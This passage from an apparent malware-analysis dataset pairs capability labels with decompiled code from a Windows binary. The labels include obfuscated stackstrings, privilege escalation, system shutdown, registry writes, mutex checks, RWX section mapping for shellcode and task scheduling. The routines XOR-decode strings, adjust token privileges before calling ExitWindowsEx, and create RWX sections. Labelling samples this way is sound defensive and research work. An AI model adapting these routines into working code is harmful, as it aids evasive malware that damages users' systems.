0x34;\n                stack0xffffffd8 = 0x43346c4d;\n                var_20h._0_1_ = 0x74;\n                fcn.00401000(0x24);\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                    if (iVar3 != 0x612de4) {\n                        *(iVar5 + var_10h) = *(&var_27h + iVar5 % var_14h + 3) ^ (iVar5 + var_10h)[&var_38h - var_10h];\n                    }\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < 0x12);\n                iVar3 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(var_10h, StringSid);\n                iVar5 = var_18h;\n                if (iVar3 == 0) {\n                    iVar5 = 1;\n                }\n                (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = var_1ch;\n            }\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar4);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return iVar5;\n}\n",
        "token_count": 854
    },
    "0040cde9": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "modify access privileges",
            "shutdown system"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040cde9(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint NewState;\n    uint lpLuid;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint TokenHandle;\n    int32_t var_4h;\n    \n    var_34h = 0xf025611;\n    var_30h = 0x5c26031a;\n    var_2ch = 0x53f0926;\n    var_28h = 0xb38452b;\n    var_24h = 0x3327100a;\n    var_10h = 0x67513342;\n    var_ch._0_2_ = 0x776f;\n    fcn.00401000(0x14);\n    iVar2 = var_4h;\n    iVar5 = 0;\n    var_4h = 6;\n    do {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar3 != 0xa18779) {\n            *(iVar5 + iVar2) = *(&var_10h + iVar5 % var_4h) ^ (iVar5 + iVar2)[&var_34h - iVar2];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x14);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar4);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, iVar2, &lpLuid);\n    NewState = 1;\n    var_14h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0, 0, 0);\n    pcVar1 = _sym.imp.USER32.dll_ExitWindowsEx;\n    iVar5 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    if (iVar5 == 0) {\n        (*pcVar1)(4, 0);\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 593
    },
    "0040d97a": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040d97a(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint lpData;\n    int32_t hKey;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint phkResult;\n    \n    phkResult = 0;\n    lpData = *0x41ca50;\n    var_44h = 0x620d6e6a;\n    var_40h = 0x6e4d6c30;\n    var_3ch = 0x6c376215;\n    var_38h = 0x62076e4b;\n    var_34h = 0x6e746c0a;\n    var_30h = 0x6c35620b;\n    var_2ch = 0x620d6e4b;\n    var_28h._0_2_ = 0x6c25;\n    var_28h._2_1_ = 0x56;\n    stack0xffffffd7 = 0x2262046e;\n    var_24h._3_1_ = 0x6c;\n    var_20h._0_1_ = 0x39;\n    var_20h._1_1_ = 0x6e;\n    var_1ch = 0x62626e39;\n    var_18h._0_2_ = 0x6c56;\n    fcn.00401000(0x4c);\n    iVar3 = var_ch;\n    iVar5 = 0;\n    var_8h = 6;\n    iVar2 = &var_44h - var_ch;\n    do {\n        iVar1 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar1 != 0xc5eae7) {\n            *(iVar5 + iVar3) = *(&var_1ch + iVar5 % var_8h) ^ (iVar5 + iVar3)[iVar2];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x26);\n    iVar5 = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, iVar3, 0, 0xf003f, &phkResult);\n    if (iVar2 == 0) {\n        var_3ch = 0x67037a05;\n        var_38h = 0x7a2a561d;\n        var_34h = 0x5600673b;\n        var_30h = 0x673a7a21;\n        var_2ch = 0x7a3e560e;\n        var_28h._0_2_ = 0x6724;\n        var_28h._2_1_ = 6;\n        stack0xffffffd7 = 0x127a3c56;\n        var_24h._3_1_ = 0x67;\n        var_20h._0_1_ = 0x6f;\n        var_20h._1_1_ = 0x56;\n        var_1ch = 0x67777a46;\n        var_18h._0_2_ = 0x566f;\n        fcn.00401000(0x3c);\n        do {\n            iVar3 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n            if (iVar3 != 0x473be4) {\n                *(iVar5 + hKey) = *(&var_1ch + iVar5 % var_8h) ^ (iVar5 + hKey)[&var_3ch - hKey];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x1e);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(phkResult, hKey, 0, 4, &lpData, 4);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, hKey);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar3 = var_ch;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 1090
    },
    "0040db0e": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040db0e(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_27h;\n    uint var_20h;\n    uint lpType;\n    uint lpcbData;\n    int32_t hKey;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint phkResult;\n    uint lpData;\n    \n    phkResult = 0;\n    lpData = 0;\n    lpType = 4;\n    lpcbData = 4;\n    var_4ch = 0x620d6e6a;\n    var_48h = 0x6e4d6c30;\n    var_44h = 0x6c376215;\n    var_40h = 0x62076e4b;\n    var_3ch = 0x6e746c0a;\n    var_38h = 0x6c35620b;\n    var_34h = 0x620d6e4b;\n    var_30h._0_2_ = 0x6c25;\n    var_30h._2_1_ = 0x56;\n    var_30h._3_1_ = 0x6e;\n    var_2ch._0_1_ = 4;\n    var_2ch._1_2_ = 0x2262;\n    stack0xffffffd3 = 0x396c;\n    var_27h._0_1_ = 0x6e;\n    stack0xffffffd8 = 0x62626e39;\n    var_20h._0_2_ = 0x6c56;\n    fcn.00401000(0x4c);\n    iVar3 = var_10h;\n    iVar6 = 0;\n    var_ch = 6;\n    iVar2 = &var_4ch - var_10h;\n    do {\n        iVar1 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar1 != 0xc5eae7) {\n            *(iVar6 + iVar3) = *(&var_27h + iVar6 % var_ch + 3) ^ (iVar6 + iVar3)[iVar2];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x26);\n    iVar6 = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, iVar3, 0, 0x20019, &phkResult);\n    if (iVar2 == 0) {\n        var_44h = 0x67037a05;\n        var_40h = 0x7a2a561d;\n        var_3ch = 0x5600673b;\n        var_38h = 0x673a7a21;\n        var_34h = 0x7a3e560e;\n        var_30h._0_2_ = 0x6724;\n        var_30h._2_1_ = 6;\n        var_30h._3_1_ = 0x56;\n        var_2ch._0_1_ = 0x3c;\n        var_2ch._1_2_ = 0x127a;\n        stack0xffffffd3 = 0x6f67;\n        var_27h._0_1_ = 0x56;\n        stack0xffffffd8 = 0x67777a46;\n        var_20h._0_2_ = 0x566f;\n        fcn.00401000(0x3c);\n        do {\n            iVar3 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n            if (iVar3 != 0x473be4) {\n                *(iVar6 + hKey) = *(&var_27h + iVar6 % var_ch + 3) ^ (iVar6 + hKey)[&var_44h - hKey];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x1e);\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(phkResult, hKey, 0, &lpType, &lpData, &lpcbData);\n        if (iVar3 != 0) {\n            lpData = 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, hKey);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar3 = var_10h;\n    }\n    uVar4 = lpData;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    return uVar4;\n}\n",
        "token_count": 1184
    },
    "0040ea67": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "terminate process",
            "create mutex",
            "check mutex and exit"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040ea67(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_3ch = 0x441c4120;\n    var_38h = 0x79377338;\n    var_34h = 0x41104a2d;\n    var_30h = 0x730f441c;\n    var_2ch = 0x4a30792f;\n    var_28h = 0x44004101;\n    var_24h = 0x792e731a;\n    var_20h = 0x411d4a2d;\n    var_1ch = 0x731e440d;\n    var_18h = 0x4a367929;\n    var_14h = 0x44184116;\n    var_10h = 0x7941732e;\n    var_ch = 0x44794173;\n    var_8h._0_1_ = 0x4a;\n    fcn.00401000(0x60);\n    iVar2 = var_4h;\n    iVar6 = 0;\n    iVar4 = &var_3ch - var_4h;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x7560df) {\n            var_4h = 5;\n            *(iVar6 + iVar2) = *(&var_ch + iVar6 % 5) ^ (iVar6 + iVar2)[iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x30);\n    iVar4 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, iVar2);\n    if (iVar4 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, iVar2);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 644
    },
    "0040586a": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040586a(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint lpBuffer;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    var_8h = param_1;\n    do {\n        *0x41caa0 = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(param_1, 0x80000000, 3, 0, 3, 0, 0);\n        if (iVar2 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n            while ((iVar3 != 0 && (param_1 = var_8h,  lpNumberOfBytesRead != 0))) {\n                puVar4 = &lpBuffer;\n                iVar3 = lpNumberOfBytesRead;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    *0x41caa0 = *0x41caa0 >> 8 ^ *((uVar1 ^ *0x41caa0 & 0xff) * 4 + 0x40f710) ^ 0xd202ef8d;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n                iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n                param_1 = var_8h;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            iVar2 = fcn.004064b2(0x41cd28);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 446
    },
    "0040d951": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.0040d951(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0040d375();\n        if (iVar1 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.0040d32d();\n    return 0;\n}\n",
        "token_count": 82
    },
    "0040dec6": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040dec6(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar1 == 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0040dcbe": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040dcbe(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint lpType;\n    uint lpcbData;\n    uint namelen;\n    \n    namelen = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(reloc.WS2_32.dll_bind, param_1, &namelen);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        lpType = 1;\n        lpcbData = 0x400;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(namelen, param_2, 0, &lpType, 0x41ce10, &lpcbData);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 217
    },
    "00407270": {
        "rules": [
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "map section object"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407270(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint var_4h;\n    \n    puVar3 = &var_ch;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_4h = 0;\n    uVar1 = (*_sym.imp.ntdll.dll_NtMapViewOfSection)();\n    (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(uVar1);\n    return;\n}\n",
        "token_count": 159
    },
    "00409c33": {
        "rules": [
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00409c33(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_25h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *0x41ca94;\n    var_18h = param_1;\n    if (*0x41cde0 == NULL) {\n        var_50h = 0x7004592e;\n        var_4ch = 0x12583c6c;\n        var_48h = 0x611c3424;\n        var_44h = 0x4d6e311c;\n        var_40h = 0x3d140070;\n        var_3ch = 0x23015f1d;\n        var_38h = 0x1c5f0d3b;\n        var_34h._0_2_ = 0x5828;\n        var_14h = 0x46733679;\n        var_10h._0_1_ = 0x58;\n        fcn.00401000(0x1e);\n        iVar2 = var_ch;\n        iVar7 = 0;\n        var_8h = 5;\n        iVar6 = &var_50h - var_ch;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n            if (iVar3 != 0xf53754) {\n                *(iVar7 + iVar2) = *(&var_14h + iVar7 % var_8h) ^ (iVar7 + iVar2)[iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x1e);\n        var_30h = 0x291d533c;\n        var_2ch._0_2_ = 0x3b07;\n        var_2ch._2_1_ = 5;\n        stack0xffffffd3 = 0x3b06695d;\n        var_25h._0_2_ = 0x6f5a;\n        var_20h = 0x476f3657;\n        var_1ch._0_1_ = 0x62;\n        fcn.00401000(0xd);\n        iVar2 = var_14h;\n        iVar7 = 0;\n        iVar6 = &var_30h - var_14h;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            if (iVar3 != 0x46b089) {\n                *(iVar7 + iVar2) = *(&var_20h + iVar7 % var_8h) ^ (iVar7 + iVar2)[iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar2, var_ch);\n        *0x41cde0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        uVar4 = (*pcVar1)(0, var_ch);\n        (*pcVar5)(uVar4);\n        pcVar5 = *0x41cde0;\n        if (*0x41cde0 == NULL) goto code_r0x00409d8f;\n    }\n    iVar2 = var_18h;\n    pcVar5 = (**0x41cde0)(var_18h);\n    if (pcVar5 != '\\0') {\n        *0x41ca94 = iVar2 != 0;\n    }\ncode_r0x00409d8f:\n    return pcVar5 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1074
    },
    "0040643f": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.0040643f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint nSize;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar1 != 0)) {\n        iVar3 = iVar1 * 2 + 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar5 = puVar4;\n        if (puVar4 != NULL) {\n            for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, puVar4, iVar1);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = NULL;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 337
    },
    "00406b54": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406b54(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    iVar1 = fcn.0040643f();\n    if (iVar1 != 0) {\n        param_1 = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(param_1);\n    if (iVar2 == 0) {\n        uVar4 = fcn.0040ad62();\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 189
    },
    "004072b2": {
        "rules": [
            "create or open section object"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004072b2(int32_t *arg_8h)\n\n{\n    uint *in_EDX;\n    int32_t iVar1;\n    uint *puVar2;\n    uchar *puVar3;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint *var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    puVar2 = &var_3ch;\n    var_10h = in_EDX;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = 0;\n    puVar2 = &var_1ch;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_ch = NULL;\n    puVar2 = &var_24h;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_30h = 0x40;\n    var_3ch = 0x18;\n    var_38h = 0;\n    var_34h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    iVar1 = (*_sym.imp.ntdll.dll_NtCreateSection)(&var_8h, 0xf001f, &var_3ch, &var_1ch, 0x40, 0x8000000, 0);\n    if (iVar1 < 0) {\n        iVar1 = (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(iVar1);\n    }\n    else {\n        iVar1 = fcn.00407270(&var_ch);\n        puVar3 = var_ch;\n        if (iVar1 == 0) {\n            for (; var_1ch != 0; var_1ch = var_1ch + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *var_10h = var_ch;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n    }\n    if ((var_8h != 0) && (arg_8h == NULL)) {\n        (*_sym.imp.ntdll.dll_ZwClose)(var_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 653
    },
    "0040ba72": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040ba72(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint NewState;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLuid;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    TokenHandle = param_2;\n    if (param_2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar2 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n            iVar2 = 0;\n            if (iVar1 != 0) {\n                var_18h = lpLuid;\n                var_14h = var_8h;\n                NewState = 1;\n                var_10h = 2;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n        iVar2 = 0;\n        if (iVar1 != 0) {\n            var_18h = lpLuid;\n            var_14h = var_8h;\n            NewState = 1;\n            var_10h = 2;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 452
    },
    "0040caa7": {
        "rules": [
            "schedule task via ITaskScheduler"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040caa7(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint noname_0_00;\n    bool bVar2;\n    int32_t *ppv;\n    int32_t *var_4h;\n    \n    bVar2 = false;\n    iVar1 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar1) {\n        iVar1 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x40f6f0, 0, 1, 0x40f6d0, &ppv);\n        if (-1 < iVar1) {\n            iVar1 = (**(*ppv + 0x20))(ppv);\n            if (-1 < iVar1) {\n                iVar1 = fcn.0040c840(noname_0_00, arg_ch);\n                if (iVar1 != 0) {\n                    iVar1 = (**(*ppv + 0x24))(ppv);\n                    bVar2 = -1 < iVar1;\n                    if (bVar2) {\n                        (**(*var_4h + 0x30))(var_4h);\n                    }\n                }\n                (**(*var_4h + 8))(var_4h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return bVar2;\n}\n",
        "token_count": 312
    }
}